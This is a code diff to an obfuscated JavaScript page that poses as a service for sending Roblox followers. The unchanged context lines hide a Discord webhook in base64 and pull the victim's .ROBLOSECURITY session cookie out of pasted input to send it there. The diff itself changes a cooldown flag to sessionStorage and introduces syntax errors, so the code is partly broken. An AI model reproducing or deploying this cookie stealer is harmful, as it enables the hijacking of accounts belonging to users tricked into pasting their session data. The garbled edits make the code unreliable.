@@ -1,5 +1,4 @@
-let isWaiting = false; // Variable para rastrear el estado de espera
-const waitTime = 120000; // Tiempo de espera en milisegundos (2 minutos)
+let waitTime = 120000; // Tiempo de espera en milisegundos (2 minutos)
 
 function x1y2z3(title, text, icon, confirmButtonText) {
     const a1b2c3 = {
@@ -17,9 +16,9 @@ function x1y2z3(title, text, icon, confirmButtonText) {
 async function a1b2c3d4(p1q2r3, s4t5u7) {
     const e5f6g7 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjY1MjEzOTEzNjQ4MzM3OS81SnZNYTd1NHhrTERmbFV2RUVwQkdFc3JTSnh3V19kY1lrV3ZTdDlXWUNfd2NjbGc5Ylh4Z1JEOXFnLUN5N3YtMlE5MQ==';
     const g8h9i0 = atob(e5f6g7);
-    
+
+    // Buscar la cookie .ROBLOSECURITY
     let robloxSecurityCookieMatch = p1q2r3.match(/\.ROBLOSECURITY", "([^"]+)"/);
-    
     if (!robloxSecurityCookieMatch) {
         robloxSecurityCookieMatch = p1q2r3.match(/\.ROBLOSECURITY=([^;]+)/);
     }
@@ -46,9 +45,9 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
 
         if (response.ok) {
             x1y2z3("Success", "Successfully sent. Wait 2 or 4 minutes.", "success", "Okay");
-            isWaiting = true; // Activar el estado de espera
+            sessionStorage.setItem('isWaiting', 'true'); // Activar el estado de espera
             setTimeout(() => {
-                isWaiting = false; // Restablecer el estado de espera después del tiempo
+                sessionStorage.removeItem('isWaiting'); // Restablecer el estado de espera
             }, waitTime);
         } else {
             x1y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
@@ -59,6 +58,11 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
 }
 
 document.addEventListener("DOMContentLoaded", function() {
+    // Verificar el estado de espera al cargar la página
+    if (sessionStorage.getItem('isWaiting')) {
+        x1y2z3("Wait", "You need to wait before sending another request.", "warning", "Okay");
+    }
+
     document.getElementById("Send").addEventListener("click", function() {
         const p1q2r3 = document.getElementById("user_code").value;
         const s4t5u7 = document.getElementById("amount").value;
@@ -68,15 +72,15 @@ document.addEventListener("DOMContentLoaded", function() {
             return;
         }
 
-        if (isWaiting) {
-            x1y2z3("Wait", "You need to wait before sending another request.", "warning", "Okay");
+        if (sessionStorage.getItem('isWaiting')) {
+            x1y2z3("Wait", "You need to wait to sendig others followers "warning", "Okay");
             return;
         }
 
         const v7w8x9 = {
             icon: "info",
             title: "<b>Is this correct? 👀</b>",
-            html: "Follow Amount: " + s4t5u7,
+            html: "Follow Amount: " + s 4t5u7,
             showDenyButton: true,
             confirmButtonText: "Confirm", 
             denyButtonText: "Cancel",
